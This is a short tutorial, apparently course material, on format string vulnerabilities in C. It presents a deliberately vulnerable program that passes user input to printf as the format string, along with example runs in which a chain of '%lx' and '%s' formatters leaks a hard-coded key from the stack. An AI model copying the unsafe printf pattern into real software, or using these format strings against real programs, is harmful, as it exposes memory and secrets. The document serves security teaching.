# Format String Attacks

Given the following C code. 
```C
void print(char *s_ptr)
{
   int i = 0xaabbccdd;
 
   printf(s_ptr);
}
 
 
int main(int argc, char **argv)
{
   char *key = "X8GX-6S5V-MOI0-PL5F";
   
   print(argv[1]);
   return 0;
}
```

We can see that the `printf()` function uses an insecure string 
as the **first parameter**, which is usually the **format string**.

Thus, we can insert formatter like `%s` or `%x` to read content 
from the current stack.

_Example_: Using a regular string
```
$ ./fmt_string hello
hello
```

_Example_: Testing the application for a format string vulnerability
```
$ ./fmt_string "hello %lx"
hello 7fffdc602088
```
The fact that we can use `%lx` to read data means that there is a string format vulnerability
in the given application.


_Example_: Attacking the format string vulnerability
```
$ ./fmt_string "hello %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %s"
hello 7fff4cf21348 7fff4cf21360 7f142e217718 0 7f142e2461b0 f0b5ff 7fff4cf23099 7fff4cf21237 aabbccdda9d0c1d5 7fff4cf21250 55a0a9d0c189 7fff4cf21348 2a9d0c050 7fff4cf21340 X8GX-6S5V-MOI0-PL5F
```

Form the last example we can see that sensitive information can be read from the stack
by using the right amount of formatters in a format string attack.

Note that all **local variables** and some **parameters** will be stored on the stack!

## References
* Daniel Regalado, Shon Harris, Allen Harper, Chris Eagle, Jonathan Ness, Branko Spasojevic, Ryan Linn, Stephen Sims. **Gray Hat Hacking**. McGraw Hill Education, 4th Edition, 2015

*Egon Teiniker, 2020 - 2022, GPL v3.0*